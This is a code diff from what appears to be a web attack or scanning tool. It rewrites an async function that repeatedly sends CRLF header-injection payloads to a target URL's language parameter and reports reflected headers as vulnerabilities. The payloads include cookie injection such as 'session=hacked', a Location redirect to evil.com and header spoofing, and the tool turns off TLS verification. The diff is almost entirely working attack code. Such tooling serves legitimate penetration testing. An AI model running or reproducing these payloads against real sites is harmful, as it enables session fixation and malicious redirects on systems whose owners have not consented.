@@ -820,28 +820,34 @@ async def open_redirect_attack(url: str, duration: int, intensity: int, threads:
             await asyncio.sleep(1.0 / max(intensity, 1))
 
 
-async def header_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_payload: str = None):
+async def header_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_payload: Optional[str] = None):
+    import urllib.parse
     crlf_payloads = [
-        '%0d%0aSet-Cookie: injected=value',
-        '%0d%0aLocation: https://evil.com',
-        '%0aX-Injected: header',
-        '%0d%0a%0d%0a<script>alert(1)</script>',
-        '\r\nSet-Cookie: session=hacked',
-        '\r\nX-Forwarded-For: 127.0.0.1',
-        '%0d%0aContent-Length: 0',
+        '%0d%0aSet-Cookie:%20injected=value',
+        '%0d%0aLocation:%20https://evil.com',
+        '%0aX-Injected:%20header',
+        '%0d%0aSet-Cookie:%20session=hacked',
+        '%0d%0aX-Forwarded-For:%20127.0.0.1',
+        '%0d%0aContent-Length:%200',
     ]
+    custom_tokens: List[str] = []
     if custom_payload:
-        import urllib.parse
         clean_custom = custom_payload.replace('\r\n', '\n').replace('\r', '\n')
+        custom_encoded_list = []
         for line in clean_custom.split('\n'):
-            if line.strip():
-                crlf_payloads.append('%0d%0a' + urllib.parse.quote(line.strip()))
-                
-    params = ['url', 'redirect', 'lang', 'ref', 'origin', 'callback', 'next']
+            stripped = line.strip()
+            if stripped:
+                custom_tokens.append(stripped.lower())
+                custom_encoded_list.append('%0d%0a' + urllib.parse.quote(stripped, safe=':=;-_/.'))
+        if custom_encoded_list:
+            crlf_payloads = custom_encoded_list + crlf_payloads
+
     start_time = time.time()
+    idx = 0
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
         while time.time() - start_time < duration and metrics['attacks_running']:
-            payload = random.choice(crlf_payloads)
+            payload = crlf_payloads[idx % len(crlf_payloads)]
+            idx += 1
             base = url.rstrip('/')
             test_url = f"{base}/api/set-lang?lang=en{payload}"
             t0 = time.time()
@@ -850,10 +856,22 @@ async def header_injection_attack(url: str, duration: int, intensity: int, threa
                     elapsed = time.time() - t0
                     await record_request_metric(True, elapsed, resp.status)
                     resp_headers_str = str(dict(resp.headers))
-                    if 'injected' in resp_headers_str or 'hacked' in resp_headers_str:
-                        vuln = {'type': 'HTTP Header Injection / CRLF', 'url': test_url, 'payload': payload, 'severity': 'High', 'evidence': resp_headers_str[:200]}
+                    resp_headers_lower = resp_headers_str.lower()
+                    matched_custom = any(tok in resp_headers_lower for tok in custom_tokens)
+                    if 'injected' in resp_headers_lower or 'hacked' in resp_headers_lower or matched_custom:
+                        decoded_payload = urllib.parse.unquote(payload).replace('\r\n', '\\r\\n').replace('\n', '\\n')
+                        vuln = {
+                            'type': 'HTTP Header Injection / CRLF',
+                            'url': test_url,
+                            'payload': decoded_payload,
+                            'severity': 'High',
+                            'evidence': resp_headers_str[:240],
+                            'timestamp': datetime.now().isoformat(),
+                            'attack_id': attack_id
+                        }
                         if await record_vulnerability(vuln):
-                            await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
+                            await manager.broadcast(json.dumps({'type': 'vulnerability', 'data': vuln}))
+                            await manager.broadcast(json.dumps({'type': 'log', 'message': f'[Header Injection] Reflected in response headers: {decoded_payload}', 'level': 'warning'}))
             except Exception:
                 await record_request_metric(False)
             await asyncio.sleep(1.0 / max(intensity, 1))
